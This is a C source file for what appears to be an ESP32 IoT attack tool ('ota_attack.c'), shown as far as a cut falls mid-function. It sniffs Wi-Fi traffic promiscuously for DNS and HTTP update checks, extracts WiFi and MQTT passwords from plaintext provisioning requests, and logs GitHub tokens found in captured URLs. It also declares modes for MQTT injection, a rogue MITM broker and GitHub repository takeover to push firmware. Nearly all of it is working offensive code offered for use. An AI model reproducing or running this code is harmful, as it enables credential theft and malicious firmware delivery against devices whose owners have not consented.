/*
 * ota_attack.c - OTA Attack Module Implementation
 *
 * Targets IoT devices that receive OTA firmware updates via MQTT.
 * Connects to target WiFi network, connects to MQTT broker, and
 * captures/injects OTA messages.
 *
 * WiFi mode: AP+STA (AP stays up for dashboard, STA connects to target)
 *
 * Thread safety:
 *   - running is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - cfg is protected by mutex
 *   - timeout_fired is volatile for cross-task visibility
 *
 * Dependencies:
 *   - WiFi STA + AP mode
 *   - esp_mqtt client
 *   - esp_http_client
 *   - cJSON
 *   - esp_timer
 *   - FreeRTOS
 */

#include "ota_attack.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_http_client.h"
#include "mqtt_client.h"
#include "cJSON.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ota_attack";

#define DEFAULT_TIMEOUT_SEC          300
#define DEFAULT_MQTT_PORT            1883
#define DEFAULT_SUBSCRIBE_TOPIC      "#"
#define DEFAULT_INJECT_COUNT         1
#define DEFAULT_INJECT_INTERVAL_MS   0
#define DEFAULT_VERIFY_SSL           false

#define STOP_SEM_TIMEOUT_MS          5000
#define WIFI_CONNECT_TIMEOUT_MS      15000
#define MQTT_CONNECT_TIMEOUT_MS      15000
#define HTTP_RECV_BUFFER_SIZE         4096
#define MAX_FIRMWARE_DOWNLOAD_SIZE    (512 * 1024)

#define TASK_STACK_SIZE              8192
#define TASK_PRIORITY                5

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running           = false;
static SemaphoreHandle_t mutex         = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t wifi_sem      = NULL;
static SemaphoreHandle_t mqtt_sem      = NULL;
static SemaphoreHandle_t download_sem  = NULL;
static TaskHandle_t task_handle        = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired      = false;

/* Timing */
static volatile int64_t start_time_ms  = 0;

/* State machine */
static volatile ota_attack_state_t attack_state = OTA_STATE_IDLE;
static volatile ota_attack_mode_t  attack_mode  = OTA_MODE_SNIFF;

/* MQTT client */
static esp_mqtt_client_handle_t mqtt_client = NULL;
static volatile bool mqtt_connected = false;

/* Counters (atomic on 32-bit Xtensa) */
static volatile uint32_t mqtt_msg_count     = 0;
static volatile uint32_t url_count          = 0;
static volatile uint32_t github_url_count   = 0;
static volatile uint32_t inject_count       = 0;
static volatile uint32_t download_count     = 0;
static volatile uint32_t fail_count         = 0;

/* Configuration */
static ota_attack_config_t cfg = {
    .mode               = OTA_MODE_SNIFF,
    .wifi_ssid          = "",
    .wifi_password      = "",
    .mqtt_broker        = "",
    .mqtt_port          = DEFAULT_MQTT_PORT,
    .mqtt_username      = "",
    .mqtt_password      = "",
    .mqtt_client_id     = "omega_ota",
    .subscribe_topic    = DEFAULT_SUBSCRIBE_TOPIC,
    .inject_topic       = "",
    .inject_payload     = "",
    .inject_count       = DEFAULT_INJECT_COUNT,
    .inject_interval_ms = DEFAULT_INJECT_INTERVAL_MS,
    .firmware_url       = "",
    .verify_ssl         = DEFAULT_VERIFY_SSL,
    .capture_dns        = true,
    .capture_http       = true,
    .target_device_ip   = {0},
    .timeout_sec        = DEFAULT_TIMEOUT_SEC,
};

/* ---- Captured messages ring buffer ---- */
static ota_msg_entry_t captured_msgs[OTA_MAX_CAPTURED_MSGS];
static int msg_head  = 0;
static int msg_count = 0;

/* ---- Captured URLs ---- */
static ota_url_entry_t captured_urls[OTA_MAX_CAPTURED_URLS];
static int url_entries = 0;

/* ---- Download result ---- */
static char download_result_json[512] = "";
static uint8_t *firmware_buffer = NULL;
static uint32_t firmware_downloaded_size = 0;
/* firmware_sha256 reserved for future SHA-256 verification of downloaded firmware */

/* ---- Poll sniff: DNS & HTTP capture ---- */
static ota_dns_entry_t  dns_entries[OTA_MAX_DNS_ENTRIES];
static int dns_entry_count = 0;
static ota_http_entry_t http_entries[OTA_MAX_HTTP_ENTRIES];
static int http_entry_count = 0;
static volatile uint32_t dns_count     = 0;
static volatile uint32_t http_count    = 0;
static volatile uint32_t ota_dns_count = 0;
static volatile uint32_t ota_http_count = 0;

/* ---- Provision Sniffer: Captured credentials ---- */
static ota_prov_cred_t prov_creds[OTA_MAX_PROV_CREDS];
static int prov_cred_count = 0;
static volatile uint32_t prov_sensitive_count = 0;
static ota_prov_summary_t prov_summary;

/* ---- Rogue Broker: MQTT MITM captured data ---- */
static ota_mitm_entry_t mitm_entries[OTA_MAX_MITM_MSGS];
static int mitm_entry_count = 0;
static volatile uint32_t mitm_count = 0;
static volatile uint32_t mitm_modified_count = 0;
static volatile uint32_t mitm_forwarded_count = 0;
static volatile int rb_devices_connected = 0;
static ota_rogue_broker_summary_t rb_summary;
/* Dynamic modification rule */
static char rb_active_modify_topic[128] = "";
static char rb_active_modify_payload[512] = "";

/* ---- Firmware Analysis: Extracted secrets ---- */
static ota_fw_secret_t fw_secrets[OTA_MAX_FW_SECRETS];
static int fw_secret_count = 0;
static volatile uint32_t fw_high_confidence_count = 0;
static ota_fw_analysis_summary_t fw_analysis_summary;

/* ================================================================== */
/*  Forward declarations                                               */
/* ================================================================== */

static void attack_task(void *arg);
static void timeout_cb(void *arg);
static void mqtt_event_handler(void *handler_args, esp_event_base_t base,
                                int32_t event_id, void *event_data);
static void store_captured_message(const char *topic, int topic_len,
                                   const char *payload, int payload_len);
static void scan_payload_for_urls(const char *topic, const char *payload, int payload_len);
static bool is_github_url(const char *url);
static void extract_github_token(const char *url, char *token_out, size_t token_len);
static esp_err_t download_firmware_internal(const char *url);
static void wifi_event_handler(void *arg, esp_event_base_t event_base,
                                int32_t event_id, void *event_data);
static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static bool is_ota_domain(const char *domain);
static bool is_ota_http_url(const char *url);

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

static int64_t now_ms(void)
{
    return (int64_t)esp_timer_get_time() / 1000;
}

const char *ota_attack_get_state_str(void)
{
    switch (attack_state) {
        case OTA_STATE_IDLE:            return "idle";
        case OTA_STATE_WIFI_CONNECTING: return "wifi_connecting";
        case OTA_STATE_MQTT_CONNECTING: return "mqtt_connecting";
        case OTA_STATE_SNIFFING:        return "sniffing";
        case OTA_STATE_SUBSCRIBED:      return "subscribed";
        case OTA_STATE_WAITING_OTA:     return "waiting_ota";
        case OTA_STATE_DOWNLOADING:     return "downloading";
        case OTA_STATE_DOWNLOADED:      return "downloaded";
        case OTA_STATE_INJECTING:       return "injecting";
        case OTA_STATE_INJECTED:        return "injected";
        case OTA_STATE_POLL_SNIFFING:   return "poll_sniffing";
        case OTA_STATE_POLL_DNS_FOUND:  return "dns_found";
        case OTA_STATE_POLL_HTTP_FOUND: return "http_found";
        case OTA_STATE_GH_PARSING_URL:  return "gh_parsing_url";
        case OTA_STATE_GH_ACCESSING_REPO: return "gh_accessing_repo";
        case OTA_STATE_GH_LISTING_FILES: return "gh_listing_files";
        case OTA_STATE_GH_UPLOADING:    return "gh_uploading";
        case OTA_STATE_GH_UPLOADED:     return "gh_uploaded";
        case OTA_STATE_GH_WAITING_DEVICE: return "gh_waiting_device";
        case OTA_STATE_DISCONNECTED:    return "disconnected";
        case OTA_STATE_ERROR:           return "error";
        /* PROVISION_SNIFF states */
        case OTA_STATE_PROV_SNIFFING:      return "prov_sniffing";
        case OTA_STATE_PROV_HTTP_CAPTURED: return "prov_http_captured";
        case OTA_STATE_PROV_CREDS_EXTRACTED: return "prov_creds_extracted";
        case OTA_STATE_PROV_WAITING:       return "prov_waiting";
        /* ROGUE_BROKER states */
        case OTA_STATE_RB_STARTING:        return "rb_starting";
        case OTA_STATE_RB_LISTENING:       return "rb_listening";
        case OTA_STATE_RB_CLIENT_CONNECTED: return "rb_client_connected";
        case OTA_STATE_RB_INTERCEPTING:    return "rb_intercepting";
        case OTA_STATE_RB_MODIFYING:       return "rb_modifying";
        case OTA_STATE_RB_FORWARDING:      return "rb_forwarding";
        /* FIRMWARE_ANALYZE states */
        case OTA_STATE_FW_ANALYZING:       return "fw_analyzing";
        case OTA_STATE_FW_SCANNING:        return "fw_scanning";
        case OTA_STATE_FW_EXTRACTING:      return "fw_extracting";
        case OTA_STATE_FW_COMPLETE:        return "fw_complete";
        default:                        return "unknown";
    }
}

static const char *mode_str(ota_attack_mode_t m)
{
    switch (m) {
        case OTA_MODE_SNIFF:      return "SNIFF";
        case OTA_MODE_CLIENT:     return "CLIENT";
        case OTA_MODE_INJECT:     return "INJECT";
        case OTA_MODE_FETCH:      return "FETCH";
        case OTA_MODE_POLL_SNIFF:      return "POLL_SNIFF";
        case OTA_MODE_GITHUB_TAKEOVER:  return "GITHUB_TAKEOVER";
        case OTA_MODE_PROVISION_SNIFF:  return "PROVISION_SNIFF";
        case OTA_MODE_ROGUE_BROKER:     return "ROGUE_BROKER";
        case OTA_MODE_FIRMWARE_ANALYZE: return "FIRMWARE_ANALYZE";
        default:                        return "UNKNOWN";
    }
}

/* Check if URL contains GitHub patterns */
static bool is_github_url(const char *url)
{
    if (!url || !url[0]) return false;
    return (strstr(url, "github.com") != NULL ||
            strstr(url, "githubusercontent.com") != NULL ||
            strstr(url, "api.github.com") != NULL ||
            strstr(url, "raw.githubusercontent.com") != NULL);
}

/* Extract GitHub token from URL (token= or ?token= or access_token=) */
static void extract_github_token(const char *url, char *token_out, size_t token_len)
{
    if (!url || !token_out || token_len == 0) return;
    token_out[0] = '\0';

    const char *patterns[] = { "token=", "access_token=", "private_token=" };
    for (int p = 0; p < 3; p++) {
        const char *pos = strstr(url, patterns[p]);
        if (pos) {
            pos += strlen(patterns[p]);
            size_t i = 0;
            while (i < token_len - 1 && pos[i] != '\0' &&
                   pos[i] != '&' && pos[i] != '?' &&
                   pos[i] != ' ' && pos[i] != '"') {
                token_out[i] = pos[i];
                i++;
            }
            token_out[i] = '\0';
            return;
        }
    }
}

/* ================================================================== */
/*  OTA domain / URL detection                                         */
/* ================================================================== */

static bool is_ota_domain(const char *domain)
{
    if (!domain || !domain[0]) return false;
    const char *patterns[] = {
        "ota", "update", "firmware", "upgrade", "release",
        "download", "deploy", "artifact", "binary",
        "github.com", "githubusercontent.com", "api.github.com",
        "aws", "cloudfront", "s3.amazonaws", "blob.core.windows",
        "storage.googleapis", "firebase", "azureedge",
        NULL
    };
    for (int i = 0; patterns[i] != NULL; i++) {
        if (strstr(domain, patterns[i]) != NULL) return true;
    }
    return false;
}

static bool is_ota_http_url(const char *url)
{
    if (!url || !url[0]) return false;
    const char *patterns[] = {
        "ota", "update", "firmware", "upgrade", "release",
        "download", "version", "check", "latest", "deploy",
        "artifact", "binary", "github.com", "githubusercontent",
        NULL
    };
    for (int i = 0; patterns[i] != NULL; i++) {
        if (strstr(url, patterns[i]) != NULL) return true;
    }
    return false;
}

/* ================================================================== */
/*  WiFi promiscuous sniffer callback (POLL_SNIFF mode)                */
/*                                                                    */
/*  Captures DNS queries (UDP port 53) and HTTP requests from the     */
/*  target device's OTA interval check. Works alongside AP+STA mode.  */
/* ================================================================== */

#include "esp_wifi_types.h"
#include <arpa/inet.h>

/* Minimal IP/UDP/TCP header structures for packet parsing */
typedef struct __attribute__((packed)) {
    uint8_t  version_ihl;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
} min_ip_hdr_t;

typedef struct __attribute__((packed)) {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t checksum;
} min_udp_hdr_t;

typedef struct __attribute__((packed)) {
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint8_t  data_offset_flags;
    uint8_t  flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urgent_ptr;
} min_tcp_hdr_t;

static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || !buf || !running) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    /* We need at least LLC/SNAP header (8 bytes) + IP header (20 bytes) */
    if (len < 28) return;

    /* Skip LLC/SNAP header: AA AA 03 00 00 00 + 2-byte ethertype */
    int offset = 0;
    if (payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03) {
        offset = 8;
    } else {
        return;
    }

    if (offset + 20 > len) return;

    const min_ip_hdr_t *ip = (const min_ip_hdr_t *)(payload + offset);

    /* Verify IP version */
    if ((ip->version_ihl >> 4) != 4) return;

    int ip_hdr_len = (ip->version_ihl & 0x0F) * 4;
    if (ip_hdr_len < 20) return;

    uint8_t protocol = ip->protocol;
    uint32_t src_ip = ip->src_ip;
    uint32_t dst_ip = ip->dst_ip;

    /* Filter by target device IP if configured */
    if (cfg.target_device_ip[0] != 0 || cfg.target_device_ip[1] != 0 ||
        cfg.target_device_ip[2] != 0 || cfg.target_device_ip[3] != 0) {
        uint32_t target_ip = ((uint32_t)cfg.target_device_ip[0] << 24) |
                             ((uint32_t)cfg.target_device_ip[1] << 16) |
                             ((uint32_t)cfg.target_device_ip[2] << 8)  |
                             ((uint32_t)cfg.target_device_ip[3]);
        if (src_ip != target_ip && dst_ip != target_ip) return;
    }

    int transport_offset = offset + ip_hdr_len;
    if (transport_offset + 8 > len) return;

    /* ---- DNS Query Capture (UDP port 53) ---- */
    if (protocol == 17 && cfg.capture_dns) {
        const min_udp_hdr_t *udp = (const min_udp_hdr_t *)(payload + transport_offset);
        uint16_t dst_port = ntohs(udp->dst_port);

        if (dst_port == 53) {
            int dns_offset = transport_offset + 8;
            if (dns_offset + 12 > len) return;

            int q_offset = dns_offset + 12;
            char domain[OTA_MAX_DNS_NAME_LEN] = "";
            int di = 0;

            while (q_offset < len && di < OTA_MAX_DNS_NAME_LEN - 1) {
                uint8_t label_len = payload[q_offset++];
                if (label_len == 0) break;
                if (di > 0 && di < OTA_MAX_DNS_NAME_LEN - 1) domain[di++] = '.';
                for (int j = 0; j < label_len && q_offset < len && di < OTA_MAX_DNS_NAME_LEN - 1; j++) {
                    domain[di++] = payload[q_offset++];
                }
            }
            domain[di] = '\0';

            if (di > 3 && dns_entry_count < OTA_MAX_DNS_ENTRIES) {
                ota_dns_entry_t *entry = &dns_entries[dns_entry_count];
                strncpy(entry->domain, domain, OTA_MAX_DNS_NAME_LEN - 1);
                entry->domain[OTA_MAX_DNS_NAME_LEN - 1] = '\0';
                memcpy(entry->client_ip, &src_ip, 4);
                memcpy(entry->server_ip, &dst_ip, 4);
                entry->timestamp_ms = now_ms();
                entry->is_ota_related = is_ota_domain(domain);

                dns_entry_count++;
                dns_count++;
                if (entry->is_ota_related) {
                    ota_dns_count++;
                    ESP_LOGI(TAG, "OTA DNS QUERY: %s (from %u.%u.%u.%u)",
                             domain,
                             (unsigned)(src_ip >> 24) & 0xFF,
                             (unsigned)(src_ip >> 16) & 0xFF,
                             (unsigned)(src_ip >> 8) & 0xFF,
                             (unsigned)(src_ip) & 0xFF);
                    attack_state = OTA_STATE_POLL_DNS_FOUND;

                    /* Store as URL candidate */
                    if (url_entries < OTA_MAX_CAPTURED_URLS) {
                        ota_url_entry_t *uentry = &captured_urls[url_entries];
                        snprintf(uentry->url, OTA_MAX_URL_LEN, "http://%s/ota", domain);
                        strncpy(uentry->source_topic, "[DNS]", OTA_MAX_TOPIC_LEN - 1);
                        uentry->timestamp_ms = now_ms();
                        uentry->has_github_token = is_github_url(domain);
                        uentry->downloaded = false;
                        uentry->firmware_size = 0;
                        if (uentry->has_github_token) github_url_count++;
                        url_entries++;
                        url_count++;
                    }
                }
            }
        }
    }

    /* ---- HTTP Request Capture (TCP port 80/8080/443/8443) ---- */
    if (protocol == 6 && cfg.capture_http) {
        const min_tcp_hdr_t *tcp = (const min_tcp_hdr_t *)(payload + transport_offset);
        uint16_t dst_port = ntohs(tcp->dst_port);

        if (dst_port == 80 || dst_port == 8080 || dst_port == 443 || dst_port == 8443) {
            int tcp_hdr_len = ((tcp->data_offset_flags >> 4) & 0x0F) * 4;
            int http_offset = transport_offset + tcp_hdr_len;
            int http_len = len - http_offset;

            if (http_len > 10 && http_offset < len) {
                const uint8_t *http_data = payload + http_offset;

                const char *method = NULL;
                if (memcmp(http_data, "GET ", 4) == 0) method = "GET";
                else if (memcmp(http_data, "POST ", 5) == 0) method = "POST";
                else if (memcmp(http_data, "PUT ", 4) == 0) method = "PUT";
                else if (memcmp(http_data, "HEAD ", 5) == 0) method = "HEAD";

                if (method && http_entry_count < OTA_MAX_HTTP_ENTRIES) {
                    const char *path_start = (const char *)http_data + strlen(method) + 1;
                    const char *path_end = strstr(path_start, " HTTP");
                    if (path_end) {
                        int path_len = path_end - path_start;
                        if (path_len > 0 && path_len < OTA_MAX_HTTP_URL_LEN) {
                            ota_http_entry_t *entry = &http_entries[http_entry_count];
                            strncpy(entry->method, method, sizeof(entry->method) - 1);
                            entry->method[sizeof(entry->method) - 1] = '\0';

                            memcpy(entry->path, path_start, path_len);
                            entry->path[path_len] = '\0';

                            /* Look for Host header */
                            entry->host[0] = '\0';
                            const char *host_hdr = strstr((const char *)http_data, "\r\nHost: ");
                            if (host_hdr) {
                                host_hdr += 8;
                                const char *host_end = strstr(host_hdr, "\r\n");
                                if (host_end) {
                                    int hlen = host_end - host_hdr;
                                    if (hlen > 0 && hlen < (int)sizeof(entry->host) - 1) {
                                        memcpy(entry->host, host_hdr, hlen);
                                        entry->host[hlen] = '\0';
                                    }
                                }
                            }

                            /* Reconstruct full URL (truncate host/path to fit) */
                            if (entry->host[0]) {
                                int prefix_len = (dst_port == 443 || dst_port == 8443) ? 8 : 7; /* https:// or http:// */
                                int avail = OTA_MAX_HTTP_URL_LEN - prefix_len - 1;
                                /* Use 120-byte buffers so compiler can prove:
                                   max output = 8 (https://) + 119 + 119 = 246 < 256 */
                                char t_host[60];
                                char t_path[60];
                                strncpy(t_host, entry->host, sizeof(t_host) - 1);
                                t_host[sizeof(t_host) - 1] = '\0';
                                strncpy(t_path, entry->path, sizeof(t_path) - 1);
                                t_path[sizeof(t_path) - 1] = '\0';
                                /* Truncate if combined too long */
                                int hlen = (int)strlen(t_host);
                                int plen = (int)strlen(t_path);
                                if (hlen + plen > avail) {
                                    int over = hlen + plen - avail;
                                    if (plen > over) plen -= over;
                                    else { over -= plen; plen = 0; hlen -= over; }
                                    t_host[hlen] = '\0';
                                    t_path[plen] = '\0';
                                }
                                snprintf(entry->full_url, OTA_MAX_HTTP_URL_LEN,
                                         "%s://%s%s",
                                         (dst_port == 443 || dst_port == 8443) ? "https" : "http",
                                         t_host, t_path);
                            } else {
                                strncpy(entry->full_url, entry->path, OTA_MAX_HTTP_URL_LEN - 1);
                                entry->full_url[OTA_MAX_HTTP_URL_LEN - 1] = '\0';
                            }

                            memcpy(entry->client_ip, &src_ip, 4);
                            entry->timestamp_ms = now_ms();
                            entry->is_ota_related = is_ota_http_url(entry->full_url);

                            http_entry_count++;
                            http_count++;

                            if (entry->is_ota_related) {
                                ota_http_count++;
                                ESP_LOGI(TAG, "OTA HTTP CHECK: %s %s (from %u.%u.%u.%u)",
                                         method, entry->full_url,
                                         (unsigned)(src_ip >> 24) & 0xFF,
                                         (unsigned)(src_ip >> 16) & 0xFF,
                                         (unsigned)(src_ip >> 8) & 0xFF,
                                         (unsigned)(src_ip) & 0xFF);
                                attack_state = OTA_STATE_POLL_HTTP_FOUND;

                                if (url_entries < OTA_MAX_CAPTURED_URLS) {
                                    ota_url_entry_t *uentry = &captured_urls[url_entries];
                                    strncpy(uentry->url, entry->full_url, OTA_MAX_URL_LEN - 1);
                                    uentry->url[OTA_MAX_URL_LEN - 1] = '\0';
                                    strncpy(uentry->source_topic, "[HTTP]", OTA_MAX_TOPIC_LEN - 1);
                                    uentry->timestamp_ms = now_ms();
                                    uentry->has_github_token = is_github_url(entry->full_url);
                                    uentry->downloaded = false;
                                    uentry->firmware_size = 0;
                                    if (uentry->has_github_token) github_url_count++;
                                    url_entries++;
                                    url_count++;
                                }
                            }
                        }
                    }

                    /* ---- PROVISION_SNIFF: Extract config from HTTP POST bodies ---- */
                    /* The ESP32 provisioning web server uses plain HTTP with zero
                     * encryption. All config (WiFi, MQTT, Modbus) is sent in POST. */
                    if (cfg.mode == OTA_MODE_PROVISION_SNIFF &&
                        strcmp(method, "POST") == 0 &&
                        prov_cred_count < OTA_MAX_PROV_CREDS) {
                        /* Find the HTTP body (after \r\n\r\n) */
                        const char *body_start = strstr((const char *)http_data, "\r\n\r\n");
                        if (body_start) {
                            body_start += 4;
                            int body_len = len - (body_start - (const char *)http_data);
                            if (body_len > 10 && body_len < 2048) {
                                /* Make null-terminated copy */
                                char *body = malloc(body_len + 1);
                                if (body) {
                                    memcpy(body, body_start, body_len);
                                    body[body_len] = '\0';

                                    /* Try JSON parse first */
                                cJSON *root = cJSON_Parse(body);
                                if (root) {
                                    /* Iterate all JSON key-value pairs */
                                    cJSON *item = root->child;
                                    while (item && prov_cred_count < OTA_MAX_PROV_CREDS) {
                                        ota_prov_cred_t *cred = &prov_creds[prov_cred_count];
                                        const char *val_str = NULL;

                                        if (cJSON_IsString(item)) {
                                            val_str = item->valuestring;
                                        } else if (cJSON_IsNumber(item)) {
                                            val_str = cJSON_PrintUnformatted(item);
                                        }

                                        if (val_str) {
                                            strncpy(cred->key, item->string,
                                                    OTA_MAX_CRED_KEY_LEN - 1);
                                            strncpy(cred->value, val_str,
                                                    OTA_MAX_CRED_VALUE_LEN - 1);
                                            snprintf(cred->source_ip, sizeof(cred->source_ip),
                                                     "%u.%u.%u.%u",
                                                     (unsigned)(src_ip >> 24) & 0xFF,
                                                     (unsigned)(src_ip >> 16) & 0xFF,
                                                     (unsigned)(src_ip >> 8) & 0xFF,
                                                     (unsigned)(src_ip) & 0xFF);
                                            cred->timestamp_ms = now_ms();

                                            /* Determine if sensitive */
                                            const char *sensitive_patterns[] = {
                                                "password", "passwd", "pass", "secret",
                                                "token", "key", "credential", "auth", NULL
                                            };
                                            cred->is_sensitive = false;
                                            for (int sp = 0; sensitive_patterns[sp]; sp++) {
                                                if (strstr(cred->key, sensitive_patterns[sp])) {
                                                    cred->is_sensitive = true;
                                                    prov_sensitive_count++;
                                                    break;
                                                }
                                            }

                                            prov_cred_count++;
                                            ESP_LOGI(TAG, "PROVISION_SNIFF: Captured %s=%s (sensitive=%d)",
                                                     cred->key,
                                                     cred->is_sensitive ? "***" : cred->value,
                                                     cred->is_sensitive);

                                            /* Update summary */
                                            if (strcmp(cred->key, "wifi_ssid") == 0 || strcmp(cred->key, "ssid") == 0)
                                                strncpy(prov_summary.wifi_ssid, cred->value, sizeof(prov_summary.wifi_ssid) - 1);
                                            else if (strcmp(cred->key, "wifi_password") == 0 || strcmp(cred->key, "password") == 0)
                                                strncpy(prov_summary.wifi_password, cred->value, sizeof(prov_summary.wifi_password) - 1);
                                            else if (strcmp(cred->key, "mqtt_broker") == 0 || strcmp(cred->key, "broker") == 0)
                                                strncpy(prov_summary.mqtt_broker, cred->value, sizeof(prov_summary.mqtt_broker) - 1);
                                            else if (strcmp(cred->key, "mqtt_port") == 0)
                                                prov_summary.mqtt_port = (uint16_t)atoi(cred->value);
                                            else if (strcmp(cred->key, "mqtt_username") == 0 || strcmp(cred->key, "mqtt_user") == 0)
                                                strncpy(prov_summary.mqtt_username, cred->value, sizeof(prov_summary.mqtt_username) - 1);
                                            else if (strcmp(cred->key, "mqtt_password") == 0 || strcmp(cred->key, "mqtt_pass") == 0)
                                                strncpy(prov_summary.mqtt_password, cred->value, sizeof(prov_summary.mqtt_password) - 1);
                                            else if (strstr(cred->key, "modbus") || strstr(cred->key, "driver"))
                                                strncpy(prov_summary.modbus_driver_url, cred->value, sizeof(prov_summary.modbus_driver_url) - 1);
                                            else if (strstr(cred->key, "time") || strstr(cred->key, "ntp"))
                                                strncpy(prov_summary.custom_time, cred->value, sizeof(prov_summary.custom_time) - 1);
                                            else if (strstr(cred->key, "device_id") || strstr(cred->key, "device"))
                                                strncpy(prov_summary.device_id, cred->value, sizeof(prov_summary.device_id) - 1);
                                            else if (strstr(cred->key, "ap_password") || strstr(cred->key, "ap_pass"))
                                                strncpy(prov_summary.ap_password, cred->value, sizeof(prov_summary.ap_password) - 1);

                                            prov_summary.total_creds_captured = prov_cred_count;
                                            prov_summary.sensitive_creds_captured = (int)prov_sensitive_count;
                                            if (prov_summary.first_capture_ms == 0)
                                                prov_summary.first_capture_ms = now_ms();
                                            prov_summary.last_capture_ms = now_ms();
                                        }
                                        item = item->next;
                                    }
                                    cJSON_Delete(root);
                                    attack_state = OTA_STATE_PROV_HTTP_CAPTURED;
                                }

                                free(body);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

/* ================================================================== */
/*  Store captured MQTT message                                        */
/* ================================================================== */

static void store_captured_message(const char *topic, int topic_len,
                                   const char *payload, int payload_len)
{
    ota_msg_entry_t *slot = &captured_msgs[msg_head];
    slot->timestamp_ms = now_ms();

    int tlen = topic_len < OTA_MAX_TOPIC_LEN - 1 ? topic_len : OTA_MAX_TOPIC_LEN - 1;
    memcpy(slot->topic, topic, tlen);
    slot->topic[tlen] = '\0';

    int plen = payload_len < OTA_MAX_PAYLOAD_LEN - 1 ? payload_len : OTA_MAX_PAYLOAD_LEN - 1;
    memcpy(slot->payload, payload, plen);
    slot->payload[plen] = '\0';

    msg_head = (msg_head + 1) % OTA_MAX_CAPTURED_MSGS;
    if (msg_count < OTA_MAX_CAPTURED_MSGS) msg_count++;

    mqtt_msg_count++;
    ESP_LOGI(TAG, "MQTT MSG [%d]: topic=%.*s payload=%.*s",
             (int)mqtt_msg_count, topic_len, topic,
             plen > 80 ? 80 : plen, payload);
}

/* ================================================================== */
/*  Scan payload for URLs                                              */
/* ================================================================== */

static void scan_payload_for_urls(const char *topic, const char *payload, int payload_len)
{
    if (!payload || payload_len <= 0) return;

    char *buf = malloc(payload_len + 1);
    if (!buf) return;
    memcpy(buf, payload, payload_len);
    buf[payload_len] = '\0';

    /* Search for common URL patterns in JSON payloads */
    const char *url_patterns[] = {
        "\"url\":", "\"download_url\":", "\"firmware_url\":",
        "\"update_url\":", "\"ota_url\":", "\"binary_url\":",
        "\"file_url\":", "\"release_url\":", "\"href\":",
        "\"repo_url\":", "\"clone_url\":", NULL
    };

    for (int i = 0; url_patterns[i] != NULL; i++) {
        const char *pos = strstr(buf, url_patterns[i]);
        while (pos != NULL) {
            pos += strlen(url_patterns[i]);
            while (*pos == ' ' || *pos == ':' || *pos == '"') pos++;

            char url[OTA_MAX_URL_LEN] = "";
            int ui = 0;
            while (pos[ui] != '\0' && pos[ui] != '"' &&
                   pos[ui] != '\'' && pos[ui] != ',' &&
                   pos[ui] != '}' && pos[ui] != ' ' &&
                   ui < OTA_MAX_URL_LEN - 1) {
                url[ui] = pos[ui];
                ui++;
            }
            url[ui] = '\0';

            if (ui > 10 && (strstr(url, "http://") == url ||
                           strstr(url, "https://") == url)) {
                if (url_entries < OTA_MAX_CAPTURED_URLS) {
                    ota_url_entry_t *entry = &captured_urls[url_entries];
                    strncpy(entry->url, url, OTA_MAX_URL_LEN - 1);
                    entry->url[OTA_MAX_URL_LEN - 1] = '\0';
                    strncpy(entry->source_topic, topic, OTA_MAX_TOPIC_LEN - 1);
                    entry->source_topic[OTA_MAX_TOPIC_LEN - 1] = '\0';
                    entry->timestamp_ms = now_ms();
                    entry->has_github_token = false;
                    entry->downloaded = false;
                    entry->firmware_size = 0;

                    if (is_github_url(url)) {
                        entry->has_github_token = true;
                        github_url_count++;
                        ESP_LOGI(TAG, "GITHUB URL found: %s", url);

                        char token[128] = "";
                        extract_github_token(url, token, sizeof(token));
                        if (token[0]) {
                            ESP_LOGI(TAG, "GITHUB TOKEN extracted: %s", token);
                        }
                    }

                    url_entries++;
                    url_count++;

                    ESP_LOGI(TAG, "Captured URL [%d]: %s (github=%d)",
                             (int)url_count, url, entry->has_github_token);
                }
            }

            pos = strstr(pos + ui, url_patterns[i]);
        }
    }

    /* Also scan for raw http/https URLs not in JSON keys */
    const char *http_pos = buf;
    while ((http_pos = strstr(http_pos, "https://")) != NULL ||
           (http_pos = strstr(http_pos ? http_pos : buf, "http://")) != NULL) {
        char url[OTA_MAX_URL_LEN] = "";
        int ui = 0;
        while (http_pos[ui] != '\0' && http_pos[ui] != '"' &&
               http_pos[ui] != '\'' && http_pos[ui] != ',' &&
               http_pos[ui] != '}' && http_pos[ui] != ' ' &&
               http_pos[ui] != '\\' && ui < OTA_MAX_URL_LEN - 1) {
            url[ui] = http_pos[ui];
            ui++;
        }
        url[ui] = '\0';

        if (ui > 10) {
            bool duplicate = false;
            for (int j = 0; j < url_entries; j++) {
                if (strcmp(captured_urls[j].url, url) == 0) {
                    duplicate = true;
                    break;
                }
            }

            if (!duplicate && url_entries < OTA_MAX_CAPTURED_URLS) {
                ota_url_entry_t *entry = &captured_urls[url_entries];
                strncpy(entry->url, url, OTA_MAX_URL_LEN - 1);
                entry->url[OTA_MAX_URL_LEN - 1] = '\0';
                strncpy(entry->source_topic, topic, OTA_MAX_TOPIC_LEN - 1);
                entry->source_topic[OTA_MAX_TOPIC_LEN - 1] = '\0';
                entry->timestamp_ms = now_ms();
                entry->has_github_token = false;
                entry->downloaded = false;
                entry->firmware_size = 0;

